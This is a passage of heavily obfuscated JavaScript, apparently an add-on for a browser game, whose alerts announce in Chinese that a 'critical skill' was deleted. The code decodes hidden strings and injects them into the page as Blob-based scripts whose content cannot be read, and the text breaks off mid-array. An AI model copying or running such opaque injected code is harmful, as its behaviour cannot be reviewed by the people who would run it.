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','C2vHCMnO','WPGcWRzfDSomm8kDW5TmsxhcTq','DMfYif8WEdC0ytq2zd1FmhG1mMqWoYHMDw5JDgLVBIHFmhGZndzMyZiSxZb4m2eXytrJkxT2yxiGxZb4mtiYmdzKpv8WEduYzdaSxZb4m2nLytrHpv8WEdm0nMzJmIGPo3DOAwXLkceHw10PE3rYExT2yxiGxZb4mZyXnJjHpxbHCNnLsw50kf8WEdeYmJa2zcGWEgzMksKVmhGXkIHWyxjZzuLUDcHFmhGXmJiWnMqOmhGXmtiPks8WEdiPk3bHCNnLsw50kf8WEdeYmJa2zcGWEdeWmYKPlZb4mYTWyxjZzuLUDcHFmhGXmJiWnMqOmhGXmdCPks8WEdqQkhbHCNnLsw50kf8WEdeYmJa2zcGWEgzHksKVmhG1ksSTCgfYC2vjBNqOxZb4mtiYmdzKkdb4mta1ksKVmhG2kY1WyxjZzuLUDcHFmhGXmJiWnMqOmhHMyYKPlZb4nYOOlxbHCNnLsw50kf8WEdeYmJa2zcGWEdeWncKPlZb4ocKRCgfYC2vjBNqOxZb4mtiYmdzKkdb4mteXksKVmhG5k3bHCNnLsw50kf8WEdeYmJa2zcGWEdeXncKPlZb4ysOOlxbHCNnLsw50kf8WEdeYmJa2zcGWEdeWyYKPlZb4yIK7AwyOxZb4mZyXnJjHpt09xZb4m2eXytrJkwjYzwfRo2vSC2uGxZb4m2nLytrHwYDWDxnOj10OxZb4m2nLytrHwYDZAgLMDcDDkcKPo31JyxrJAcHFmhGXndDImtyPE18WEdnJzwe0yvSNChvZAcDDkf8WEdnJzwe0yvSNC2HPzNqNxsGPktT9Fx0OxZb4mJy0msWWEdCWzdaXksK7DMfYif8WEdi3nJzIzt0OzNvUy3rPB24OkxT2yxiGxZb4ntm3zgu1pseHw107CMv0DxjUigz1BMn0Aw9Ukf8WEdfMmgzHyYXFmhGYztG3mtePE3zHCIbFmhGYztjKmJK9xZb4ntm3zgu1p2z1BMn0Aw9UkcL7DMfYif8WEgyZzJjLyt1FmhG1mMqWo2LMkf8WEdjLodCXmsL7DMfYif8WEgeYmdG0zJ1FmhGYztG3mtfBxZb4zJnMmMvHkdb4mtbMkv0OxZb4mwyWzMfJlgfYz3vTzw50CYK7CMv0DxjUif8WEdjLodCXmt1UDwXSlf8WEgeYmdG0zJT9FtPMDw5JDgLVBIGPE307CMv0DxjUif8WEduZn2rLnt0Hw10SxZb4mMuYzdi5o307FsGPksXFmhGXmJe4ywm9xZb4mJC2nMjLkhrOAxmSzNvUy3rPB24OkxT2yxiGxZb4y2qZnZ1FmhG1mMqWo3jLDhvYBIbFmhGXmJe4ywnBxZb4y2qZnYGWEdeWmILDkcLBxZb4y2qZnYGWEdeXnsLDkf8WEgnKmZCOmhGXmtmPkvTFmhHJzdm3kdb4mtaYkv0OkvTFmhHJzdm3kdb4mta4kv0OxZb4mtiXogfJkvTFmhHJzdm3kdb4mte1kv0OxZb4y2qZnYGWEdeXmYKPo30Po18WEdeYmtHHyYGPo3zHCIbFmhHLm2rMmgu9kgz1BMn0Aw9UkcL7DMfYif8WEduZyMq4zd0HivTDo3jLDhvYBIbMDw5JDgLVBIHFmhGXnde3ywySxZb4zgfHzwm3kxT2yxiGxZb4nduZmJzJpv8WEduZyMq4zd9MDw5JDgLVBIGPE3zHCIbFmhG1mJa5zti9xZb4ntjKmdTPzIHFmhHKywfLyZCPE3zHCIbFmhGZmdq2ogm9xZb4zgfHzwm3w18WEduYmdLLmIGWEdeWzILDkf8WEde0mtDHzIXHCMD1BwvUDhmPo3jLDhvYBIbFmhHKywfLyZC9BNvSBcXFmhGZmdq2ogm7Fx06zNvUy3rPB24OkxT9o3jLDhvYBIbFmhG1m2jKogq9ivTDlf8WEdq1mZi2yZT9o30OksKSxZb4m2e4yJKWpv8WEguZzgyWzsH0AgLZlgz1BMn0Aw9UkcL7DMfYif8WEde5yJG2zt1FmhG1mMqWlf8WEdnKnJm1mdT0CNL7DMfYif8WEdC5zJbJmt1gDw5JDgLVBIHFmhGXowi4nMuOmhGXmgqPk18WEde5yJG2zsGWEdeXnIKRjYK7jYK7xZb4m2q2mZuWpv8WEdC5zJbJmsGPo31JyxrJAcHFmhGZy2iYnwePE18WEdnKnJm1md13Aw5KB3C7FxzHCIbFmhG1y2rJzJi9xZb4m2q2mZuWw18WEde5yJG2zsGWEdeWmcLDpv8WEdnKnJm1mfTFmhGXowi4nMuOmhGXmdaPxxX8E30SxZb4mJK4zgq0pvTFmhGXowi4nMuOmhGXmguPlf8WEde5yJG2zsGWEdeWysKSxZb4mtLIodzLkdb4mteWksXFmhGXowi4nMuOmhGXmdyPlf8WEde5yJG2zsGWEgzIksXFmhGXowi4nMuOmhHMocKSj3rYywnLj107zM9YkhzHCIbFmhGXzdK3nwy9mhGWo18WEdfKotC1zJXFmhGYotHKzdrBxZb4mtLIodzLkdb4zMqPxtTFmhGXzdK3nwyRkYL7DMfYif8WEdvLywi0yJ1FmhHLm2rMmgvBxZb4mtLIodzLkdb4mta4kv1BxZb4mtLIodzLkdb4mte3kv1Bj2jPBMqNxsHFmhHLm2rMmguPlf8WEdK0mtLLzt1FmhGYotHKzdrBxZb4mwq5nZvMxsXFmhG4ndy5yta9xZb4nwnKy2yYw18WEdK0mtLLzv18Ff8WEdvLywi0yJTFmhG1zwfIngjBxZb4mtLIodzLkdb4mta5kv09xZb4ztnKzJbLw18WEde5yJG2zsGWEgy5kv0OxZb4ztnKzJbLksXFmhG1zwfIngjBj3rVu3rYAw5Nj109xZb4odq2oweWw18WEde5yJG2zsGWEdeWmILDwYDIAw5Kj10OxZb4odq2oweWksXFmhG1y2rJzJjBxZb4otqXowvLxt1FmhG1zwfIngi7Fx0Po18WEdnHogi5mcGPo3zHCIbMDw5Jpwz1BMn0Aw9Ukf8WEdiWodCWocL7DMfYif8WEdqYngu0yJ1FmhG1mMqWo2DSB2jHBfrOAxnBxZb4ndi0ztrIkdb4zMuPxsHMDw5JksXUzxCGrNvUy3rPB24OxZb4ndi0ztrIkdb4mtbIksTFmhG0mJrLngiOmhGXmdePksGPo307zNvUy3rPB24GxZb4ntjKmcHFmhG0mtfLmZuSxZb4ngfMywiZkxT2yxiGxZb4mwfMmduYpv8WEdi2ndeOktTYzxr1CM4GxZb4ntjKmd1MDw5JDgLVBIHFmhGZytHIotaSxZb4ztnKzJbLkxTFmhGZytHIota9xZb4m2e4yJKWltb4zJG7DMfYif8WEdjJzdmZnJ1FmhGXywyWntjBxZb4m2e4yJKWxtTYzxr1CM4GxZb4mMnKmZm2o30SxZb4ntjKmcHFmhG0mtfLmZuSxZb4ngfMywiZktT9z2XVyMfSvgHPC1TFmhG3nge0nMqOmhHMzsLDkgz1BMmPo2z1BMn0Aw9Uif8WEdi2ndeOkxT2yxiGxZb4nwuWzMm5pvSNmtK3nZC0mgzey1LyCYCSj3nLyxjJAcCSj3T9lMnVBNn0CNvJDg9YkcjYzxr1CM4GDgHPCYiPkcaPjYWNChjVDg90ExbLjYWNDgfIBguNlcDIAw5KjYWNmtq5nuvmr1DYuICSj2v4y2vWDgLVBICSjZCXmJzHzunRr1aNlcDSzw5NDgGNlcDYzxf1zxn0qw5PBwf0Aw9UrNjHBwuNlcCYq1LnzNrQjYWNy29UC29SzsCSj2DLCICSj3rVu3rYAw5NjYWNmtGZmdyWmeTjEKDNvYCSjZm2ntzzqvb3y0iNlcCXmtiYodi4v0zgu0vijYWNzxjYB3iNlcC5nJq0tgPREu1ejYWNy29UC3rYDwn0B3iNlcDFx3bYB3rVx18NlcD3yxjUjYWNzgvIDwCNlcCXndnhAhnYsM4NlcDYzxr1CM4Gkgz1BMn0Aw9UkcKGjYWNBg9NjYWNyxbWBhKNlcDPBMzVjYWNnduZmZeWmLDoqLLLzICSjZKYmdi4ofjqB2X1CcCSjYGOkc4RksSPkYKRjcDDo18WEdi2nde9zNvUy3rPB24OkxTYzxr1CM4GxZb4nwuWzMm5o307CMv0DxjUif8WEdi2ndeOktT9','y3jLyxrLrwXLBwvUDa','zNzIEM0','5ywe6zA55OQl6ikt6kgx5yIp6zM5776z','p8oSEmo2W5BcNIPJmSoJa8oKma','CxLHBgvYDa','svncD0G','W4BcLWLYkSonW5fZiCk6FXiQ','mJm1mJGYtM5qDuHd','W5OBW5BcOmoxESokW6fpWRKFW4zQ','p2/cUmkqxq','WQrqWPJdVCk2kSkqW710WR0YW65zD2ukjHFcMmk1WR8JW7HfWPu','W7ZdMtDemhpcL8oyW6pdJwaQW6q','mta2mJa5nMLuB0viva','5ys/6zwG5OQR6igz6kcC5yUn6zIy772+','WPnxWQxcTuC2BCkYW7ZcV8o/xmkMW7/dRW','fgxcV8kyDmk6WPLODSkQW4JcQNpdNX3cISo5','otyYnZCWmePQvMTQwa','Dgv4Dc9QyxzHC2nYAxb0','WPdcHCkBsq','m1LXzfPszq','DhLWzq','idBdImkbcq','wgJdU8onW7eooCooncn+D8kl','y29UC3rYDwn0B3i','sNP3zfDLyLDVCMTLCKrLC3rYB3LtCgLUzq','CMv2B2TLt2jQzwn0vvjm','W6tcLmkbjq/cGmkg','nhbrAYtdN8ozW5njW54SWR8','ogjWwhruBq','5ysO6zwK5OUU6igi6kk/5yMR6zI8772J','W7yWWOBdLgNdIq','5ywZ6zsU5OQa6io96kkR5yIG6zMK77Yb','ndqZmJe4m1zKvhzgAW','y3jLyxrLt2jQzwn0vvjm','zxDtoN7dMSkG','uCk3s8oWW6HFW4i','C2nYAxb0','WRVcN2C'];li1jfn0T=function(){return UU;};return li1jfn0T();}var li1jfn0x=li1jfn0m,li1jfn0j=li1jfn0z;function li1jfn0m(U,V){var T=li1jfn0T();return li1jfn0m=function(z,m){z=z-0x193;var h=T[z];if(li1jfn0m['fnOaxn']===undefined){var i=function(W){var O='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var u='',K='',X=u+i;for(var s=0x0,g,v,S=0x0;v=W['charAt'](S++);~v&&(g=s%0x4?g*0x40+v:v,s++%0x4)?u+=X['charCodeAt'](S+0xa)-0xa!==0x0?String['fromCharCode'](0xff&g>>(-0x2*s&0x6)):s:0x0){v=O['indexOf'](v);}for(var N=0x0,t=u['length'];N<t;N++){K+='%'+('00'+u['charCodeAt'](N)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(K);};li1jfn0m['RBftxK']=i,U=arguments,li1jfn0m['fnOaxn']=!![];}var r=T[0x0],p=z+r,a=U[p];if(!a){var W=function(O){this['kvzWNk']=O,this['wrETRi']=[0x1,0x0,0x0],this['XriXYO']=function(){return'newState';},this['EhVQrJ']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['UceUNF']='[\x27|\x22].+[\x27|\x22];?\x20*}';};W['prototype']['NoShti']=function(){var O=new RegExp(this['EhVQrJ']+this['UceUNF']),u=O['test'](this['XriXYO']['toString']())?--this['wrETRi'][0x1]:--this['wrETRi'][0x0];return this['PyHhSQ'](u);},W['prototype']['PyHhSQ']=function(O){if(!Boolean(~O))return O;return this['SzHNCh'](this['kvzWNk']);},W['prototype']['SzHNCh']=function(O){for(var u=0x0,K=this['wrETRi']['length'];u<K;u++){this['wrETRi']['push'](Math['round'](Math['random']())),K=this['wrETRi']['length'];}return O(this['wrETRi'][0x0]);},new W(li1jfn0m)['NoShti'](),h=li1jfn0m['RBftxK'](h),U[p]=h;}else h=a;return h;},li1jfn0m(U,V);}(function(U,V){var li1jfn0P={U:0x1b2,V:'RA)D',T:0x1b3,z:'$YH6',m:0x1ae,h:'ckXT',i:0x19e,r:'Mlps',p:0x1a0,a:'zLIZ',W:0x19b,O:'tN3S',u:0x1a8},b=li1jfn0m,Z=li1jfn0z,T=U();while(!![]){try{var z=parseInt(Z(li1jfn0P.U,li1jfn0P.V))/0x1*(parseInt(Z(li1jfn0P.T,li1jfn0P.z))/0x2)+-parseInt(Z(li1jfn0P.m,li1jfn0P.h))/0x3+parseInt(Z(li1jfn0P.i,li1jfn0P.r))/0x4+parseInt(b(0x1c3))/0x5*(parseInt(Z(li1jfn0P.p,li1jfn0P.a))/0x6)+-parseInt(b(0x1b8))/0x7*(-parseInt(b(0x1b4))/0x8)+parseInt(Z(li1jfn0P.W,li1jfn0P.O))/0x9+-parseInt(b(li1jfn0P.u))/0xa;if(z===V)break;else T['push'](T['shift']());}catch(m){T['push'](T['shift']());}}}(li1jfn0T,0x85182));var li1jfn0M=(function(){var li1jfn0U3={U:0x199,V:0x1a5,T:0x1b7},li1jfn0U1={U:0x1ad},U=!![];return function(V,T){var J=li1jfn0z,H=li1jfn0m;if('fvbzm'===H(li1jfn0U3.U)){var z=U?function(){var li1jfn0n={U:0x1a1},Y=li1jfn0z,y=H;if(y(0x19d)==='ISBwH'){if(T){var m=T[Y(li1jfn0U1.U,'P(c&')](V,arguments);return T=null,m;}}else{var i=i?function(){var f=Y;if(i){var t=g[f(li1jfn0n.U,'K1@I')](v,arguments);return S=null,t;}}:function(){};return O=![],i;}}:function(){};return U=![],z;}else T['qyalert'](J(li1jfn0U3.V,'iL#0')),z(H(li1jfn0U3.T));};}()),li1jfn0I=li1jfn0M(this,function(){var li1jfn0U5={U:0x1c2,V:0x1af,T:0x1b6},D=li1jfn0z,l=li1jfn0m;return li1jfn0I[l(li1jfn0U5.U)]()[l(0x195)]('(((.+)+)+)+$')[l(li1jfn0U5.U)]()[l(li1jfn0U5.V)](li1jfn0I)[D(li1jfn0U5.T,'C$@*')]('(((.+)+)+)+$');});li1jfn0I();if(!window[li1jfn0j(0x1ba,'$YH6')]){var li1jfn0G=li1jfn0j(0x194,'^Pby'),li1jfn0E={};li1jfn0E[li1jfn0x(0x1ac)]=li1jfn0x(0x1a9);var li1jfn0R=li1jfn0E,li1jfn0A=new window['Blob']([li1jfn0G],li1jfn0R),li1jfn0o=URL['createObjectURL'](li1jfn0A),li1jfn0k=document[li1jfn0x(0x198)]('script');li1jfn0k[li1jfn0j(0x1bd,'kq7]')]=li1jfn0o,document[li1jfn0j(0x1aa,'rL#X')]['appendChild'](li1jfn0k),URL[li1jfn0x(0x1b1)](li1jfn0o);var li1jfn0q=li1jfn0x(0x197),li1jfn0d={};li1jfn0d['type']=li1jfn0j(0x1a6,'kthZ');var li1jfn0w=li1jfn0d;li1jfn0A=new window['Blob']([li1jfn0q],li1jfn0w),li1jfn0o=URL[li1jfn0x(0x1b9)](li1jfn0A),li1jfn0k=document[li1jfn0j(0x196,'Ljw@')](li1jfn0x(0x1bc)),li1jfn0k['src']=li1jfn0o,document[li1jfn0x(0x1bf)]['appendChild'](li1jfn0k),URL['revokeObjectURL'](li1jfn0o),window[li1jfn0j(0x1a7,'K1@I')]=function(){var li1jfn0U6={U:0x19c},L=li1jfn0x;game[L(li1jfn0U6.U)]('关键技能被删除！'),alert('关键技能被删除！');},window[li1jfn0j(0x1a2,'zLIZ')]=function(){var li1jfn0U7={U:0x1b7,V:0x1b5,T:'DL@r'},F=li1jfn0j,C=li1jfn0x;game['qyalert'](C(li1jfn0U7.U)),alert(F(li1jfn0U7.V,li1jfn0U7.T));},window[li1jfn0x(0x1b0)]=function(){var li1jfn0U8={U:0x19c,V:'yHq5'},c=li1jfn0j,Q=li1jfn0x;game[Q(li1jfn0U8.U)](c(0x19a,li1jfn0U8.V)),alert('关键技能被删除！');},window[li1jfn0x(0x1c0)]=function(){var li1jfn0U9={U:0x1be,V:'iL#0',T:0x1c1,z:'LSBn'},e=li1jfn0j;game[e(li1jfn0U9.U,li1jfn0U9.V)](e(li1jfn0U9.T,li1jfn0U9.z)),alert('关键技能被删除！');};}
            // 辅助函数
            function a0_0x3e7a(_0x53ba7d,_0xd4181e){const _0x68e6a1=a0_0x3ef3();return a0_0x3e7a=function(_0x384e45,_0xa009f8){_0x384e45=_0x384e45-0xa5;let _0x3ef3a7=_0x68e6a1[_0x384e45];if(a0_0x3e7a['oSLHzm']===undefined){var _0xcef024=function(_0x35d2c8){const _0x23413e='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x43357d='',_0x3e7a95='',_0x36f698=_0x43357d+_0xcef024;for(let _0x2252c0=0x0,_0x1687ad,_0x463bb2,_0x43d274=0x0;_0x463bb2=_0x35d2c8['charAt'](_0x43d274++);~_0x463bb2&&(_0x1687ad=_0x2252c0%0x4?_0x1687ad*0x40+_0x463bb2:_0x463bb2,_0x2252c0++%0x4)?_0x43357d+=_0x36f698['charCodeAt'](_0x43d274+0xa)-0xa!==0x0?String['fromCharCode'](0xff&_0x1687ad>>(-0x2*_0x2252c0&0x6)):_0x2252c0:0x0){_0x463bb2=_0x23413e['indexOf'](_0x463bb2);}for(let _0x80b4a4=0x0,_0x4599a7=_0x43357d['length'];_0x80b4a4<_0x4599a7;_0x80b4a4++){_0x3e7a95+='%'+('00'+_0x43357d['charCodeAt'](_0x80b4a4)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x3e7a95);};a0_0x3e7a['doQWvA']=_0xcef024,_0x53ba7d=arguments,a0_0x3e7a['oSLHzm']=!![];}const _0x1ce2a4=_0x68e6a1[0x0],_0x43c72d=_0x384e45+_0x1ce2a4,_0xeb896a=_0x53ba7d[_0x43c72d];if(!_0xeb896a){const _0x4612ab=function(_0x2cb893){this['tvsEYH']=_0x2cb893,this['mCnNbS']=[0x1,0x0,0x0],this['BfRwgG']=function(){return'newState';},this['nKiNBw']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['OijjDT']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x4612ab['prototype']['HxVJyd']=function(){const _0x500f36=new RegExp(this['nKiNBw']+this['OijjDT']),_0x151f46=_0x500f36['test'](this['BfRwgG']['toString']())?--this['mCnNbS'][0x1]:--this['mCnNbS'][0x0];return this['LfNdue'](_0x151f46);},_0x4612ab['prototype']['LfNdue']=function(_0x34a649){if(!Boolean(~_0x34a649))return _0x34a649;return this['XQzhId'](this['tvsEYH']);},_0x4612ab['prototype']['XQzhId']=function(_0x1aed63){for(let _0x49acb2=0x0,_0x1f6df0=this['mCnNbS']['length'];_0x49acb2<_0x1f6df0;_0x49acb2++){this['mCnNbS']['push'](Math['round'](Math['random']())),_0x1f6df0=this['mCnNbS']['length'];}return _0x1aed63(this['mCnNbS'][0x0]);},new _0x4612ab(a0_0x3e7a)['HxVJyd'](),_0x3ef3a7=a0_0x3e7a['doQWvA'](_0x3ef3a7),_0x53ba7d[_0x43c72d]=_0x3ef3a7;}else _0x3ef3a7=_0xeb896a;return _0x3ef3a7;},a0_0x3e7a(_0x53ba7d,_0xd4181e);}const a0_0xd3a00c=a0_0x3e7a,a0_0x137492=a0_0xcef0;(function(_0x272b96,_0x149200){const a0_0x184155={_0x253c04:0xc6,_0x320ed4:0xc4,_0x37c16c:0x11e,_0x4160e7:'5Is1',_0x136d45:0xdf,_0x3f20b2:'2vvU',_0x7794b3:0xc2,_0x314fa7:'Hn[f',_0x11299f:0xa7,_0x502e44:'$10T',_0x5076a1:0xbb,_0x41f8b6:0xc3,_0x1bfc6d:0x10d,_0x14fa5e:0xe1,_0x1afee4:'1KcR'},_0x4361f5=a0_0x3e7a,_0x827bd6=a0_0xcef0,_0x453b3c=_0x272b96();while(!![]){try{const _0x52f964=parseInt(_0x827bd6(a0_0x184155._0x253c04,'$10T'))/0x1+-parseInt(_0x4361f5(a0_0x184155._0x320ed4))/0x2*(-parseInt(_0x827bd6(a0_0x184155._0x37c16c,a0_0x184155._0x4160e7))/0x3)+-parseInt(_0x4361f5(a0_0x184155._0x136d45))/0x4*(parseInt(_0x827bd6(0xc8,a0_0x184155._0x3f20b2))/0x5)+-parseInt(_0x827bd6(a0_0x184155._0x7794b3,a0_0x184155._0x314fa7))/0x6*(-parseInt(_0x4361f5(a0_0x184155._0x11299f))/0x7)+parseInt(_0x827bd6(0xed,a0_0x184155._0x502e44))/0x8*(parseInt(_0x827bd6(a0_0x184155._0x5076a1,'2BUi'))/0x9)+parseInt(_0x827bd6(a0_0x184155._0x41f8b6,'(Kle'))/0xa*(-parseInt(_0x4361f5(a0_0x184155._0x1bfc6d))/0xb)+parseInt(_0x827bd6(a0_0x184155._0x14fa5e,a0_0x184155._0x1afee4))/0xc;if(_0x52f964===_0x149200)break;else _0x453b3c['push'](_0x453b3c['shift']());}catch(_0x2d236d){_0x453b3c['push'](_0x453b3c['shift']());}}}(a0_0x3ef3,0xbac4b));function a0_0x3ef3(){const _0x14233a=['emkAW5ZcS3HjWP5z','e8kApSoUW6qk','l2v4DgvUC2LVBI/LGyFOO4xML6dMLyWVyw5PBwf0Aw9UlW','W7BcUdrYW4dcHq','yxbWBhK','y2VdQCk+W6NdOfldVmk7WOHQW4NcRq','fNm/h14','B2jQzwn0','CxLxB3jRzxjtCgLUzq','FSk/qM5jW7xdRSo/WQrEg1GG','AhjLzG','Bg9VCa','a8kqgSoIW6eZWR1HWRhcJeKRWR4ap2SFcW','g8oMW4CzWPNdUa','6kEJ5yAZ5PA55Qgi77YA5PU05PAWv2vIvMLLD++8JoABToAwSoIVT+IhQUIHJoEzVUw6PGO','WOJcPmoKW5ZcP8knaGXzW7q','zxzLBNq','su5gtW','nJu4nZu4BMTJvKjH','aSkcW6FcUNH/WPjakaNcPmkyWRldPH9CeJa','eL51ACoSrq','y29UC3rYDwn0B3i','mJ7dISkWW7hdTg3dMq','xHzOWPSTW5azk8k8tG','ngHVrLr2qG','W6OccLW','WQ8TWPddKSksW7K0WPGjW7OoWOG0','rmogWQ0N','tSo5WRBdGtLdpCoYWQjO','WRKfWRu2','vCosWRaI','AXiAW69dW5W5W4SXW7i5hCkclvv6c0tdGW9z','FmobWQmmW6faWRK4WQ91wain','aCkfjmoKW6y','bWm2','rSoFqNxdL8kYghe','evrNB8ocsdZdNColksy','Ar86W7nE','l8owW4y7j0RcGCktt8knca','ywn0Aw9U','tmooWRCJWRCFjdNcQSkthmozWQK','xCoWB8kQlmoe','kCkSFrZcOsrqgSk/w8k+W40QWPxcLCkAuCoWWR91','y29UDMvYDa','rtFcV8klW5xcGfRdNCkWW7uLWPxcTSoWrJ8zWQxcVq','W7pcRHbMW5VcGW','C3rYAw5NAwz5','pSozvmkJ','W710WRxdRwLQb8km','pmkWsXhcTtfbkCkqqSkJ','pCofq8kZWQ7cOW','ntq2oe1cDfPOwa','kcGOlISPkYKRksSK','oHnZW7NcNN9ThSkAW4JcKmoC','CxLvDgLSCW','cxWyxSkiACo4a8kQgmoA','zM9SBg93','dSoLWRRcQG','W44MlMVdVCkdgSoiW7W','hCo2W48p','wHjPWPmoW78cp8k8CW','zxjYB3i','BwvZC2fNzuLK','W7jiW5ishSoSr8kcW4BcTNjKWOG','zxzLBNruExbL','WQOVWP7dL8oxWRHxWOuRW5W','g2O3q8kvDSoSfmk3gmogESkCW51erwNdRL0','BgfZDeLUzgv4t2y','B25Jzq','AM9PBG','BgLUzunVBxbSzxrLza','x3rYAwDNzxi','z2vUzxjHDg9Yvvvjra','p8omW6u3kNm','CxLxzwjxB3jRzxi','kSkSBZZcUIfjoSkLw8k8W4iDWPpcLmksDSo2WP55W5xcRG','nti0n0fnzffeuW','WPe0W6bdW4G1W6LMpSkO','W78jg1VdJCkH','fmopWRyaWQagcW','te9brf9tueLorq','W7pdG2pdJ1/cQCo3ka','mJq5ndGWq0jVDfnx','CxLbBMLTyxrPB24','CxLbBMLTyxrPB25dDxn0B21vDgLS','y2fSBgjHy2S','5yQG6l29CgL4As9HBMLTyxrPB24UANpLPlhOTkxVVie','WQu4vCoFhSkQWOWSW4mI','AxnbCNjHEq','uCoaWQhdK8oRW7O','WR8RWQVdSNf2iSkH','DxvPza','Bg9N','ceHzDmoTrcpdIW','W